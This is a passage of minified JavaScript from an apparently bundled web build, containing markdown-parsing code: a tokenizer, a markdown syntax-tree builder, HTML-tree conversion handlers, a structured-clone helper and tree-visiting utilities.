Z.end=C(),m.events.push(["exit",Z,m]),Z}function M(ne,Z){U(ne,Z.from)}function R(ne,Z){Z.restore()}function B(ne,Z){return me;function me(ye,J,pe){let oe,ae,xe,q;return Array.isArray(ye)?Q(ye):"tokenize"in ye?Q([ye]):We(ye);function We(De){return Ke;function Ke(vt){const lt=vt!==null&&De[vt],Tt=vt!==null&&De.null,ut=[...Array.isArray(lt)?lt:lt?[lt]:[],...Array.isArray(Tt)?Tt:Tt?[Tt]:[]];return Q(ut)(vt)}}function Q(De){return oe=De,ae=0,De.length===0?pe:k(De[ae])}function k(De){return Ke;function Ke(vt){return q=$(),xe=De,De.partial||(m.currentConstruct=De),De.name&&m.parser.constructs.disable.null.includes(De.name)?Ve():De.tokenize.call(Z?Object.assign(Object.create(m),Z):m,h,se,Ve)(vt)}}function se(De){return ne(xe,q),J}function Ve(De){return q.restore(),++ae<oe.length?k(oe[ae]):pe}}}function U(ne,Z){ne.resolveAll&&!l.includes(ne)&&l.push(ne),ne.resolve&&vr(m.events,Z,m.events.length-Z,ne.resolve(m.events.slice(Z),m)),ne.resolveTo&&(m.events=ne.resolveTo(m.events,m))}function $(){const ne=C(),Z=m.previous,me=m.currentConstruct,ye=m.events.length,J=Array.from(f);return{from:ye,restore:pe};function pe(){r=ne,m.previous=Z,m.currentConstruct=me,m.events.length=ye,f=J,Y()}}function Y(){r.line in a&&r.column<2&&(r.column=a[r.line],r.offset+=a[r.line]-1)}}function yj(e,t){const n=t.start._index,r=t.start._bufferIndex,a=t.end._index,l=t.end._bufferIndex;let u;if(n===a)u=[e[n].slice(r,l)];else{if(u=e.slice(n,a),r>-1){const f=u[0];typeof f=="string"?u[0]=f.slice(r):u.shift()}l>0&&u.push(e[a].slice(0,l))}return u}function vj(e,t){let n=-1;const r=[];let a;for(;++n<e.length;){const l=e[n];let u;if(typeof l=="string")u=l;else switch(l){case-5:{u="\r";break}case-4:{u=`
`;break}case-3:{u=`\r
`;break}case-2:{u=t?" ":"	";break}case-1:{if(!t&&a)continue;u=" ";break}default:u=String.fromCharCode(l)}a=l===-2,r.push(u)}return r.join("")}function bj(e){const r={constructs:Zk([gj,...(e||{}).extensions||[]]),content:a(R5),defined:[],document:a(F5),flow:a(tj),lazy:{},string:a(ij),text:a(aj)};return r;function a(l){return u;function u(f){return xj(r,l,f)}}}function Ej(e){for(;!rT(e););return e}const Db=/[\0\t\n\r]/g;function wj(){let e=1,t="",n=!0,r;return a;function a(l,u,f){const h=[];let m,x,g,b,E;for(l=t+(typeof l=="string"?l.toString():new TextDecoder(u||void 0).decode(l)),g=0,t="",n&&(l.charCodeAt(0)===65279&&g++,n=void 0);g<l.length;){if(Db.lastIndex=g,m=Db.exec(l),b=m&&m.index!==void 0?m.index:l.length,E=l.charCodeAt(b),!m){t=l.slice(g);break}if(E===10&&g===b&&r)h.push(-3),r=void 0;else switch(r&&(h.push(-5),r=void 0),g<b&&(h.push(l.slice(g,b)),e+=b-g),E){case 0:{h.push(65533),e++;break}case 9:{for(x=Math.ceil(e/4)*4,h.push(-2);e++<x;)h.push(-1);break}case 10:{h.push(-4),e=1;break}default:r=!0,e=1}g=b+1}return f&&(r&&h.push(-5),t&&h.push(t),h.push(null)),h}}const kj=/\\([!-/:-@[-`{-~])|&(#(?:\d{1,7}|x[\da-f]{1,6})|[\da-z]{1,31});/gi;function Tj(e){return e.replace(kj,Cj)}function Cj(e,t,n){if(t)return t;if(n.charCodeAt(0)===35){const a=n.charCodeAt(1),l=a===120||a===88;return Jk(n.slice(l?2:1),l?16:10)}return fx(n)||e}const uT={}.hasOwnProperty;function Sj(e,t,n){return typeof t!="string"&&(n=t,t=void 0),Nj(n)(Ej(bj(n).document().write(wj()(e,t,!0))))}function Nj(e){const t={transforms:[],canContainEols:["emphasis","fragment","heading","paragraph","strong"],enter:{autolink:l(fr),autolinkProtocol:$,autolinkEmail:$,atxHeading:l($e),blockQuote:l(Tt),characterEscape:$,characterReference:$,codeFenced:l(ut),codeFencedFenceInfo:u,codeFencedFenceMeta:u,codeIndented:l(ut,u),codeText:l(bt,u),codeTextData:$,data:$,codeFlowValue:$,definition:l(Mt),definitionDestinationString:u,definitionLabelString:u,definitionTitleString:u,emphasis:l(nn),hardBreakEscape:l(Hn),hardBreakTrailing:l(Hn),htmlFlow:l(Un,u),htmlFlowData:$,htmlText:l(Un,u),htmlTextData:$,image:l(zn),label:u,link:l(fr),listItem:l(Wn),listItemValue:b,listOrdered:l(it,g),listUnordered:l(it),paragraph:l(Tr),reference:k,referenceString:u,resourceDestinationString:u,resourceTitleString:u,setextHeading:l($e),strong:l(Wi),thematicBreak:l(ue)},exit:{atxHeading:h(),atxHeadingSequence:M,autolink:h(),autolinkEmail:lt,autolinkProtocol:vt,blockQuote:h(),characterEscapeValue:Y,characterReferenceMarkerHexadecimal:Ve,characterReferenceMarkerNumeric:Ve,characterReferenceValue:De,characterReference:Ke,codeFenced:h(O),codeFencedFence:P,codeFencedFenceInfo:E,codeFencedFenceMeta:C,codeFlowValue:Y,codeIndented:h(N),codeText:h(J),codeTextData:Y,data:Y,definition:h(),definitionDestinationString:_,definitionLabelString:T,definitionTitleString:A,emphasis:h(),hardBreakEscape:h(Z),hardBreakTrailing:h(Z),htmlFlow:h(me),htmlFlowData:Y,htmlText:h(ye),htmlTextData:Y,image:h(oe),label:xe,labelText:ae,lineEnding:ne,link:h(pe),listItem:h(),listOrdered:h(),listUnordered:h(),paragraph:h(),referenceString:se,resourceDestinationString:q,resourceTitleString:We,resource:Q,setextHeading:h(U),setextHeadingLineSequence:B,setextHeadingText:R,strong:h(),thematicBreak:h()}};cT(t,(e||{}).mdastExtensions||[]);const n={};return r;function r(H){let L={type:"root",children:[]};const F={stack:[L],tokenStack:[],config:t,enter:f,exit:m,buffer:u,resume:x,data:n},X=[];let G=-1;for(;++G<H.length;)if(H[G][1].type==="listOrdered"||H[G][1].type==="listUnordered")if(H[G][0]==="enter")X.push(G);else{const te=X.pop();G=a(H,te,G)}for(G=-1;++G<H.length;){const te=t[H[G][0]];uT.call(te,H[G][1].type)&&te[H[G][1].type].call(Object.assign({sliceSerialize:H[G][2].sliceSerialize},F),H[G][1])}if(F.tokenStack.length>0){const te=F.tokenStack[F.tokenStack.length-1];(te[1]||Lb).call(F,void 0,te[0])}for(L.position={start:sa(H.length>0?H[0][1].start:{line:1,column:1,offset:0}),end:sa(H.length>0?H[H.length-2][1].end:{line:1,column:1,offset:0})},G=-1;++G<t.transforms.length;)L=t.transforms[G](L)||L;return L}function a(H,L,F){let X=L-1,G=-1,te=!1,Ce,je,Re,Be;for(;++X<=F;){const Ue=H[X];switch(Ue[1].type){case"listUnordered":case"listOrdered":case"blockQuote":{Ue[0]==="enter"?G++:G--,Be=void 0;break}case"lineEndingBlank":{Ue[0]==="enter"&&(Ce&&!Be&&!G&&!Re&&(Re=X),Be=void 0);break}case"linePrefix":case"listItemValue":case"listItemMarker":case"listItemPrefix":case"listItemPrefixWhitespace":break;default:Be=void 0}if(!G&&Ue[0]==="enter"&&Ue[1].type==="listItemPrefix"||G===-1&&Ue[0]==="exit"&&(Ue[1].type==="listUnordered"||Ue[1].type==="listOrdered")){if(Ce){let Le=X;for(je=void 0;Le--;){const qe=H[Le];if(qe[1].type==="lineEnding"||qe[1].type==="lineEndingBlank"){if(qe[0]==="exit")continue;je&&(H[je][1].type="lineEndingBlank",te=!0),qe[1].type="lineEnding",je=Le}else if(!(qe[1].type==="linePrefix"||qe[1].type==="blockQuotePrefix"||qe[1].type==="blockQuotePrefixWhitespace"||qe[1].type==="blockQuoteMarker"||qe[1].type==="listItemIndent"))break}Re&&(!je||Re<je)&&(Ce._spread=!0),Ce.end=Object.assign({},je?H[je][1].start:Ue[1].end),H.splice(je||X,0,["exit",Ce,Ue[2]]),X++,F++}if(Ue[1].type==="listItemPrefix"){const Le={type:"listItem",_spread:!1,start:Object.assign({},Ue[1].start),end:void 0};Ce=Le,H.splice(X,0,["enter",Le,Ue[2]]),X++,F++,Re=void 0,Be=!0}}}return H[L][1]._spread=te,F}function l(H,L){return F;function F(X){f.call(this,H(X),X),L&&L.call(this,X)}}function u(){this.stack.push({type:"fragment",children:[]})}function f(H,L,F){this.stack[this.stack.length-1].children.push(H),this.stack.push(H),this.tokenStack.push([L,F||void 0]),H.position={start:sa(L.start),end:void 0}}function h(H){return L;function L(F){H&&H.call(this,F),m.call(this,F)}}function m(H,L){const F=this.stack.pop(),X=this.tokenStack.pop();if(X)X[0].type!==H.type&&(L?L.call(this,H,X[0]):(X[1]||Lb).call(this,H,X[0]));else throw new Error("Cannot close `"+H.type+"` ("+ru({start:H.start,end:H.end})+"): its not open");F.position.end=sa(H.end)}function x(){return dx(this.stack.pop())}function g(){this.data.expectingFirstListItemValue=!0}function b(H){if(this.data.expectingFirstListItemValue){const L=this.stack[this.stack.length-2];L.start=Number.parseInt(this.sliceSerialize(H),10),this.data.expectingFirstListItemValue=void 0}}function E(){const H=this.resume(),L=this.stack[this.stack.length-1];L.lang=H}function C(){const H=this.resume(),L=this.stack[this.stack.length-1];L.meta=H}function P(){this.data.flowCodeInside||(this.buffer(),this.data.flowCodeInside=!0)}function O(){const H=this.resume(),L=this.stack[this.stack.length-1];L.value=H.replace(/^(\r?\n|\r)|(\r?\n|\r)$/g,""),this.data.flowCodeInside=void 0}function N(){const H=this.resume(),L=this.stack[this.stack.length-1];L.value=H.replace(/(\r?\n|\r)$/g,"")}function T(H){const L=this.resume(),F=this.stack[this.stack.length-1];F.label=L,F.identifier=Qr(this.sliceSerialize(H)).toLowerCase()}function A(){const H=this.resume(),L=this.stack[this.stack.length-1];L.title=H}function _(){const H=this.resume(),L=this.stack[this.stack.length-1];L.url=H}function M(H){const L=this.stack[this.stack.length-1];if(!L.depth){const F=this.sliceSerialize(H).length;L.depth=F}}function R(){this.data.setextHeadingSlurpLineEnding=!0}function B(H){const L=this.stack[this.stack.length-1];L.depth=this.sliceSerialize(H).codePointAt(0)===61?1:2}function U(){this.data.setextHeadingSlurpLineEnding=void 0}function $(H){const F=this.stack[this.stack.length-1].children;let X=F[F.length-1];(!X||X.type!=="text")&&(X=le(),X.position={start:sa(H.start),end:void 0},F.push(X)),this.stack.push(X)}function Y(H){const L=this.stack.pop();L.value+=this.sliceSerialize(H),L.position.end=sa(H.end)}function ne(H){const L=this.stack[this.stack.length-1];if(this.data.atHardBreak){const F=L.children[L.children.length-1];F.position.end=sa(H.end),this.data.atHardBreak=void 0;return}!this.data.setextHeadingSlurpLineEnding&&t.canContainEols.includes(L.type)&&($.call(this,H),Y.call(this,H))}function Z(){this.data.atHardBreak=!0}function me(){const H=this.resume(),L=this.stack[this.stack.length-1];L.value=H}function ye(){const H=this.resume(),L=this.stack[this.stack.length-1];L.value=H}function J(){const H=this.resume(),L=this.stack[this.stack.length-1];L.value=H}function pe(){const H=this.stack[this.stack.length-1];if(this.data.inReference){const L=this.data.referenceType||"shortcut";H.type+="Reference",H.referenceType=L,delete H.url,delete H.title}else delete H.identifier,delete H.label;this.data.referenceType=void 0}function oe(){const H=this.stack[this.stack.length-1];if(this.data.inReference){const L=this.data.referenceType||"shortcut";H.type+="Reference",H.referenceType=L,delete H.url,delete H.title}else delete H.identifier,delete H.label;this.data.referenceType=void 0}function ae(H){const L=this.sliceSerialize(H),F=this.stack[this.stack.length-2];F.label=Tj(L),F.identifier=Qr(L).toLowerCase()}function xe(){const H=this.stack[this.stack.length-1],L=this.resume(),F=this.stack[this.stack.length-1];if(this.data.inReference=!0,F.type==="link"){const X=H.children;F.children=X}else F.alt=L}function q(){const H=this.resume(),L=this.stack[this.stack.length-1];L.url=H}function We(){const H=this.resume(),L=this.stack[this.stack.length-1];L.title=H}function Q(){this.data.inReference=void 0}function k(){this.data.referenceType="collapsed"}function se(H){const L=this.resume(),F=this.stack[this.stack.length-1];F.label=L,F.identifier=Qr(this.sliceSerialize(H)).toLowerCase(),this.data.referenceType="full"}function Ve(H){this.data.characterReferenceType=H.type}function De(H){const L=this.sliceSerialize(H),F=this.data.characterReferenceType;let X;F?(X=Jk(L,F==="characterReferenceMarkerNumeric"?10:16),this.data.characterReferenceType=void 0):X=fx(L);const G=this.stack[this.stack.length-1];G.value+=X}function Ke(H){const L=this.stack.pop();L.position.end=sa(H.end)}function vt(H){Y.call(this,H);const L=this.stack[this.stack.length-1];L.url=this.sliceSerialize(H)}function lt(H){Y.call(this,H);const L=this.stack[this.stack.length-1];L.url="mailto:"+this.sliceSerialize(H)}function Tt(){return{type:"blockquote",children:[]}}function ut(){return{type:"code",lang:null,meta:null,value:""}}function bt(){return{type:"inlineCode",value:""}}function Mt(){return{type:"definition",identifier:"",label:null,title:null,url:""}}function nn(){return{type:"emphasis",children:[]}}function $e(){return{type:"heading",depth:0,children:[]}}function Hn(){return{type:"break"}}function Un(){return{type:"html",value:""}}function zn(){return{type:"image",title:null,url:"",alt:null}}function fr(){return{type:"link",title:null,url:"",children:[]}}function it(H){return{type:"list",ordered:H.type==="listOrdered",start:null,spread:H._spread,children:[]}}function Wn(H){return{type:"listItem",spread:H._spread,checked:null,children:[]}}function Tr(){return{type:"paragraph",children:[]}}function Wi(){return{type:"strong",children:[]}}function le(){return{type:"text",value:""}}function ue(){return{type:"thematicBreak"}}}function sa(e){return{line:e.line,column:e.column,offset:e.offset}}function cT(e,t){let n=-1;for(;++n<t.length;){const r=t[n];Array.isArray(r)?cT(e,r):Aj(e,r)}}function Aj(e,t){let n;for(n in t)if(uT.call(t,n))switch(n){case"canContainEols":{const r=t[n];r&&e[n].push(...r);break}case"transforms":{const r=t[n];r&&e[n].push(...r);break}case"enter":case"exit":{const r=t[n];r&&Object.assign(e[n],r);break}}}function Lb(e,t){throw e?new Error("Cannot close `"+e.type+"` ("+ru({start:e.start,end:e.end})+"): a different token (`"+t.type+"`, "+ru({start:t.start,end:t.end})+") is open"):new Error("Cannot close document, a token (`"+t.type+"`, "+ru({start:t.start,end:t.end})+") is still open")}function Dj(e){const t=this;t.parser=n;function n(r){return Sj(r,{...t.data("settings"),...e,extensions:t.data("micromarkExtensions")||[],mdastExtensions:t.data("fromMarkdownExtensions")||[]})}}function Lj(e,t){const n={type:"element",tagName:"blockquote",properties:{},children:e.wrap(e.all(t),!0)};return e.patch(t,n),e.applyData(t,n)}function _j(e,t){const n={type:"element",tagName:"br",properties:{},children:[]};return e.patch(t,n),[e.applyData(t,n),{type:"text",value:`
`}]}function Ij(e,t){const n=t.value?t.value+`
`:"",r={};t.lang&&(r.className=["language-"+t.lang]);let a={type:"element",tagName:"code",properties:r,children:[{type:"text",value:n}]};return t.meta&&(a.data={meta:t.meta}),e.patch(t,a),a=e.applyData(t,a),a={type:"element",tagName:"pre",properties:{},children:[a]},e.patch(t,a),a}function Pj(e,t){const n={type:"element",tagName:"del",properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function jj(e,t){const n={type:"element",tagName:"em",properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function Rj(e,t){const n=typeof e.options.clobberPrefix=="string"?e.options.clobberPrefix:"user-content-",r=String(t.identifier).toUpperCase(),a=Wl(r.toLowerCase()),l=e.footnoteOrder.indexOf(r);let u,f=e.footnoteCounts.get(r);f===void 0?(f=0,e.footnoteOrder.push(r),u=e.footnoteOrder.length):u=l+1,f+=1,e.footnoteCounts.set(r,f);const h={type:"element",tagName:"a",properties:{href:"#"+n+"fn-"+a,id:n+"fnref-"+a+(f>1?"-"+f:""),dataFootnoteRef:!0,ariaDescribedBy:["footnote-label"]},children:[{type:"text",value:String(u)}]};e.patch(t,h);const m={type:"element",tagName:"sup",properties:{},children:[h]};return e.patch(t,m),e.applyData(t,m)}function Oj(e,t){const n={type:"element",tagName:"h"+t.depth,properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function Fj(e,t){if(e.options.allowDangerousHtml){const n={type:"raw",value:t.value};return e.patch(t,n),e.applyData(t,n)}}function dT(e,t){const n=t.referenceType;let r="]";if(n==="collapsed"?r+="[]":n==="full"&&(r+="["+(t.label||t.identifier)+"]"),t.type==="imageReference")return[{type:"text",value:"!["+t.alt+r}];const a=e.all(t),l=a[0];l&&l.type==="text"?l.value="["+l.value:a.unshift({type:"text",value:"["});const u=a[a.length-1];return u&&u.type==="text"?u.value+=r:a.push({type:"text",value:r}),a}function Mj(e,t){const n=String(t.identifier).toUpperCase(),r=e.definitionById.get(n);if(!r)return dT(e,t);const a={src:Wl(r.url||""),alt:t.alt};r.title!==null&&r.title!==void 0&&(a.title=r.title);const l={type:"element",tagName:"img",properties:a,children:[]};return e.patch(t,l),e.applyData(t,l)}function Bj(e,t){const n={src:Wl(t.url)};t.alt!==null&&t.alt!==void 0&&(n.alt=t.alt),t.title!==null&&t.title!==void 0&&(n.title=t.title);const r={type:"element",tagName:"img",properties:n,children:[]};return e.patch(t,r),e.applyData(t,r)}function Hj(e,t){const n={type:"text",value:t.value.replace(/\r?\n|\r/g," ")};e.patch(t,n);const r={type:"element",tagName:"code",properties:{},children:[n]};return e.patch(t,r),e.applyData(t,r)}function Uj(e,t){const n=String(t.identifier).toUpperCase(),r=e.definitionById.get(n);if(!r)return dT(e,t);const a={href:Wl(r.url||"")};r.title!==null&&r.title!==void 0&&(a.title=r.title);const l={type:"element",tagName:"a",properties:a,children:e.all(t)};return e.patch(t,l),e.applyData(t,l)}function zj(e,t){const n={href:Wl(t.url)};t.title!==null&&t.title!==void 0&&(n.title=t.title);const r={type:"element",tagName:"a",properties:n,children:e.all(t)};return e.patch(t,r),e.applyData(t,r)}function Wj(e,t,n){const r=e.all(t),a=n?qj(n):fT(t),l={},u=[];if(typeof t.checked=="boolean"){const x=r[0];let g;x&&x.type==="element"&&x.tagName==="p"?g=x:(g={type:"element",tagName:"p",properties:{},children:[]},r.unshift(g)),g.children.length>0&&g.children.unshift({type:"text",value:" "}),g.children.unshift({type:"element",tagName:"input",properties:{type:"checkbox",checked:t.checked,disabled:!0},children:[]}),l.className=["task-list-item"]}let f=-1;for(;++f<r.length;){const x=r[f];(a||f!==0||x.type!=="element"||x.tagName!=="p")&&u.push({type:"text",value:`
`}),x.type==="element"&&x.tagName==="p"&&!a?u.push(...x.children):u.push(x)}const h=r[r.length-1];h&&(a||h.type!=="element"||h.tagName!=="p")&&u.push({type:"text",value:`
`});const m={type:"element",tagName:"li",properties:l,children:u};return e.patch(t,m),e.applyData(t,m)}function qj(e){let t=!1;if(e.type==="list"){t=e.spread||!1;const n=e.children;let r=-1;for(;!t&&++r<n.length;)t=fT(n[r])}return t}function fT(e){const t=e.spread;return t??e.children.length>1}function $j(e,t){const n={},r=e.all(t);let a=-1;for(typeof t.start=="number"&&t.start!==1&&(n.start=t.start);++a<r.length;){const u=r[a];if(u.type==="element"&&u.tagName==="li"&&u.properties&&Array.isArray(u.properties.className)&&u.properties.className.includes("task-list-item")){n.className=["contains-task-list"];break}}const l={type:"element",tagName:t.ordered?"ol":"ul",properties:n,children:e.wrap(r,!0)};return e.patch(t,l),e.applyData(t,l)}function Yj(e,t){const n={type:"element",tagName:"p",properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function Vj(e,t){const n={type:"root",children:e.wrap(e.all(t))};return e.patch(t,n),e.applyData(t,n)}function Gj(e,t){const n={type:"element",tagName:"strong",properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function Qj(e,t){const n=e.all(t),r=n.shift(),a=[];if(r){const u={type:"element",tagName:"thead",properties:{},children:e.wrap([r],!0)};e.patch(t.children[0],u),a.push(u)}if(n.length>0){const u={type:"element",tagName:"tbody",properties:{},children:e.wrap(n,!0)},f=fi(t.children[1]),h=uh(t.children[t.children.length-1]);f&&h&&(u.position={start:f,end:h}),a.push(u)}const l={type:"element",tagName:"table",properties:{},children:e.wrap(a,!0)};return e.patch(t,l),e.applyData(t,l)}function Kj(e,t,n){const r=n?n.children:void 0,l=(r?r.indexOf(t):1)===0?"th":"td",u=n&&n.type==="table"?n.align:void 0,f=u?u.length:t.children.length;let h=-1;const m=[];for(;++h<f;){const g=t.children[h],b={},E=u?u[h]:void 0;E&&(b.align=E);let C={type:"element",tagName:l,properties:b,children:[]};g&&(C.children=e.all(g),e.patch(g,C),C=e.applyData(g,C)),m.push(C)}const x={type:"element",tagName:"tr",properties:{},children:e.wrap(m,!0)};return e.patch(t,x),e.applyData(t,x)}function Xj(e,t){const n={type:"element",tagName:"td",properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}const _b=9,Ib=32;function Zj(e){const t=String(e),n=/\r?\n|\r/g;let r=n.exec(t),a=0;const l=[];for(;r;)l.push(Pb(t.slice(a,r.index),a>0,!0),r[0]),a=r.index+r[0].length,r=n.exec(t);return l.push(Pb(t.slice(a),a>0,!1)),l.join("")}function Pb(e,t,n){let r=0,a=e.length;if(t){let l=e.codePointAt(r);for(;l===_b||l===Ib;)r++,l=e.codePointAt(r)}if(n){let l=e.codePointAt(a-1);for(;l===_b||l===Ib;)a--,l=e.codePointAt(a-1)}return a>r?e.slice(r,a):""}function Jj(e,t){const n={type:"text",value:Zj(String(t.value))};return e.patch(t,n),e.applyData(t,n)}function e8(e,t){const n={type:"element",tagName:"hr",properties:{},children:[]};return e.patch(t,n),e.applyData(t,n)}const t8={blockquote:Lj,break:_j,code:Ij,delete:Pj,emphasis:jj,footnoteReference:Rj,heading:Oj,html:Fj,imageReference:Mj,image:Bj,inlineCode:Hj,linkReference:Uj,link:zj,listItem:Wj,list:$j,paragraph:Yj,root:Vj,strong:Gj,table:Qj,tableCell:Xj,tableRow:Kj,text:Jj,thematicBreak:e8,toml:od,yaml:od,definition:od,footnoteDefinition:od};function od(){}const hT=-1,fh=0,au=1,mf=2,px=3,mx=4,gx=5,xx=6,pT=7,mT=8,jb=typeof self=="object"?self:globalThis,n8=(e,t)=>{const n=(a,l)=>(e.set(l,a),a),r=a=>{if(e.has(a))return e.get(a);const[l,u]=t[a];switch(l){case fh:case hT:return n(u,a);case au:{const f=n([],a);for(const h of u)f.push(r(h));return f}case mf:{const f=n({},a);for(const[h,m]of u)f[r(h)]=r(m);return f}case px:return n(new Date(u),a);case mx:{const{source:f,flags:h}=u;return n(new RegExp(f,h),a)}case gx:{const f=n(new Map,a);for(const[h,m]of u)f.set(r(h),r(m));return f}case xx:{const f=n(new Set,a);for(const h of u)f.add(r(h));return f}case pT:{const{name:f,message:h}=u;return n(new jb[f](h),a)}case mT:return n(BigInt(u),a);case"BigInt":return n(Object(BigInt(u)),a);case"ArrayBuffer":return n(new Uint8Array(u).buffer,u);case"DataView":{const{buffer:f}=new Uint8Array(u);return n(new DataView(f),u)}}return n(new jb[l](u),a)};return r},Rb=e=>n8(new Map,e)(0),Gs="",{toString:r8}={},{keys:i8}=Object,Mo=e=>{const t=typeof e;if(t!=="object"||!e)return[fh,t];const n=r8.call(e).slice(8,-1);switch(n){case"Array":return[au,Gs];case"Object":return[mf,Gs];case"Date":return[px,Gs];case"RegExp":return[mx,Gs];case"Map":return[gx,Gs];case"Set":return[xx,Gs];case"DataView":return[au,n]}return n.includes("Array")?[au,n]:n.includes("Error")?[pT,n]:[mf,n]},ud=([e,t])=>e===fh&&(t==="function"||t==="symbol"),a8=(e,t,n,r)=>{const a=(u,f)=>{const h=r.push(u)-1;return n.set(f,h),h},l=u=>{if(n.has(u))return n.get(u);let[f,h]=Mo(u);switch(f){case fh:{let x=u;switch(h){case"bigint":f=mT,x=u.toString();break;case"function":case"symbol":if(e)throw new TypeError("unable to serialize "+h);x=null;break;case"undefined":return a([hT],u)}return a([f,x],u)}case au:{if(h){let b=u;return h==="DataView"?b=new Uint8Array(u.buffer):h==="ArrayBuffer"&&(b=new Uint8Array(u)),a([h,[...b]],u)}const x=[],g=a([f,x],u);for(const b of u)x.push(l(b));return g}case mf:{if(h)switch(h){case"BigInt":return a([h,u.toString()],u);case"Boolean":case"Number":case"String":return a([h,u.valueOf()],u)}if(t&&"toJSON"in u)return l(u.toJSON());const x=[],g=a([f,x],u);for(const b of i8(u))(e||!ud(Mo(u[b])))&&x.push([l(b),l(u[b])]);return g}case px:return a([f,u.toISOString()],u);case mx:{const{source:x,flags:g}=u;return a([f,{source:x,flags:g}],u)}case gx:{const x=[],g=a([f,x],u);for(const[b,E]of u)(e||!(ud(Mo(b))||ud(Mo(E))))&&x.push([l(b),l(E)]);return g}case xx:{const x=[],g=a([f,x],u);for(const b of u)(e||!ud(Mo(b)))&&x.push(l(b));return g}}const{message:m}=u;return a([f,{name:h,message:m}],u)};return l},Ob=(e,{json:t,lossy:n}={})=>{const r=[];return a8(!(t||n),!!t,new Map,r)(e),r},xs=typeof structuredClone=="function"?(e,t)=>t&&("json"in t||"lossy"in t)?Rb(Ob(e,t)):structuredClone(e):(e,t)=>Rb(Ob(e,t));function s8(e,t){const n=[{type:"text",value:""}];return t>1&&n.push({type:"element",tagName:"sup",properties:{},children:[{type:"text",value:String(t)}]}),n}function l8(e,t){return"Back to reference "+(e+1)+(t>1?"-"+t:"")}function o8(e){const t=typeof e.options.clobberPrefix=="string"?e.options.clobberPrefix:"user-content-",n=e.options.footnoteBackContent||s8,r=e.options.footnoteBackLabel||l8,a=e.options.footnoteLabel||"Footnotes",l=e.options.footnoteLabelTagName||"h2",u=e.options.footnoteLabelProperties||{className:["sr-only"]},f=[];let h=-1;for(;++h<e.footnoteOrder.length;){const m=e.footnoteById.get(e.footnoteOrder[h]);if(!m)continue;const x=e.all(m),g=String(m.identifier).toUpperCase(),b=Wl(g.toLowerCase());let E=0;const C=[],P=e.footnoteCounts.get(g);for(;P!==void 0&&++E<=P;){C.length>0&&C.push({type:"text",value:" "});let T=typeof n=="string"?n:n(h,E);typeof T=="string"&&(T={type:"text",value:T}),C.push({type:"element",tagName:"a",properties:{href:"#"+t+"fnref-"+b+(E>1?"-"+E:""),dataFootnoteBackref:"",ariaLabel:typeof r=="string"?r:r(h,E),className:["data-footnote-backref"]},children:Array.isArray(T)?T:[T]})}const O=x[x.length-1];if(O&&O.type==="element"&&O.tagName==="p"){const T=O.children[O.children.length-1];T&&T.type==="text"?T.value+=" ":O.children.push({type:"text",value:" "}),O.children.push(...C)}else x.push(...C);const N={type:"element",tagName:"li",properties:{id:t+"fn-"+b},children:e.wrap(x,!0)};e.patch(m,N),f.push(N)}if(f.length!==0)return{type:"element",tagName:"section",properties:{dataFootnotes:!0,className:["footnotes"]},children:[{type:"element",tagName:l,properties:{...xs(u),id:"footnote-label"},children:[{type:"text",value:a}]},{type:"text",value:`
`},{type:"element",tagName:"ol",properties:{},children:e.wrap(f,!0)},{type:"text",value:`
`}]}}const hh=function(e){if(e==null)return f8;if(typeof e=="function")return ph(e);if(typeof e=="object")return Array.isArray(e)?u8(e):c8(e);if(typeof e=="string")return d8(e);throw new Error("Expected function, string, or object as test")};function u8(e){const t=[];let n=-1;for(;++n<e.length;)t[n]=hh(e[n]);return ph(r);function r(...a){let l=-1;for(;++l<t.length;)if(t[l].apply(this,a))return!0;return!1}}function c8(e){const t=e;return ph(n);function n(r){const a=r;let l;for(l in e)if(a[l]!==t[l])return!1;return!0}}function d8(e){return ph(t);function t(n){return n&&n.type===e}}function ph(e){return t;function t(n,r,a){return!!(h8(n)&&e.call(this,n,typeof r=="number"?r:void 0,a||void 0))}}function f8(){return!0}function h8(e){return e!==null&&typeof e=="object"&&"type"in e}const gT=[],p8=!0,L0=!1,m8="skip";function xT(e,t,n,r){let a;typeof t=="function"&&typeof n!="function"?(r=n,n=t):a=t;const l=hh(a),u=r?-1:1;f(e,void 0,[])();function f(h,m,x){const g=h&&typeof h=="object"?h:{};if(typeof g.type=="string"){const E=typeof g.tagName=="string"?g.tagName:typeof g.name=="string"?g.name:void 0;Object.defineProperty(b,"name",{value:"node ("+(h.type+(E?"<"+E+">":""))+")"})}return b;function b(){let E=gT,C,P,O;if((!t||l(h,m,x[x.length-1]||void 0))&&(E=g8(n(h,x)),E[0]===L0))return E;if("children"in h&&h.children){const N=h;if(N.children&&E[0]!==m8)for(P=(r?N.children.length:-1)+u,O=x.concat(N);P>-1&&P<N.children.length;){const T=N.children[P];if(C=f(T,P,O)(),C[0]===L0)return C;P=typeof C[1]=="number"?C[1]:P+u}}return E}}}function g8(e){return Array.isArray(e)?e:typeof e=="number"?[p8,e]:e==null?gT:[e]}function mh(e,t,n,r){let a,l,u;typeof t=="function"&&typeof n!="function"?(l=void 0,u=t,a=n):(l=t,u=n,a=r),xT(e,l,f,a);function f(h,m){const x=m[m.length-1],g=x?x.children.indexOf(h):void 0;return u(h,g,x)}}const _0={}.hasOwnProperty,x8={};function y8(e,t){const n=t||x8,r=new Map,a=new Map,l=new Map,u={...t8,...n.handlers},f={all:m,applyData:b8,definitionById:r,footnoteById:a,footnoteCounts:l,footnoteOrder:[],handlers:u,one:h,options:n,patch:v8,wrap:w8};return mh(e,function(x){if(x.type==="definition"||x.type==="footnoteDefinition"){const g=x.type==="definition"?r:a,b=String(x.identifier).toUpperCase();g.has(b)||g.set(b,x)}}),f;function h(x,g){const b=x.type,E=f.handlers[b];if(_0.call(f.handlers,b)&&E)return E(f,x,g);if(f.options.passThrough&&f.options.passThrough.includes(b)){if("children"in x){const{children:P,...O}=x,N=xs(O);return N.children=f.all(x),N}return xs(x)}return(f.options.unknownHandler||E8)(f,x,g)}function m(x){const g=[];if("children"in x){const b=x.children;let E=-1;for(;++E<b.length;){const C=f.one(b[E],x);if(C){if(E&&b[E-1].type==="break"&&(!Array.isArray(C)&&C.type==="text"&&(C.value=Fb(C.value)),!Array.isArray(C)&&C.type==="element")){const P=C.children[0];P&&P.type==="text"&&(P.value=Fb(P.value))}Array.isArray(C)?g.push(...C):g.push(C)}}}return g}}function 